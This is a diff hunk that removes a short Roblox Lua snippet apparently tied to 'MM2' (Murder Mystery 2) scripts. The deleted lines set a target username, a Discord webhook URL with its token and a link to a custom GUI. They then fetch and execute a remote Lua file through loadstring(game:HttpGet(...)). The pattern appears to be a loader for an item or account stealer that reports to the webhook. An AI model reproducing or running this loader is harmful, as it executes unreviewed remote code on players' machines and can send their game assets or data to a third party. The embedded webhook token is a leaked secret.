@@ -1,5 +1,0 @@
-Username = "AZRA3LET" --// Username
-Webhook = "https://discord.com/api/webhooks/1469915988848935136/ciV10AP_QPbgmQhf-duf2BW1lBOyVI-XdDDkwHbEJ0fz_3iPqVHzSUpg3-XIS8OW5SQu" --// Webhook
-CustomGui = "https://raw.githubusercontent.com/byudoi/MM2-SCRIPT/refs/heads/main/pantalla" --// Paste Raw Link Script
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/testo.lua"))()
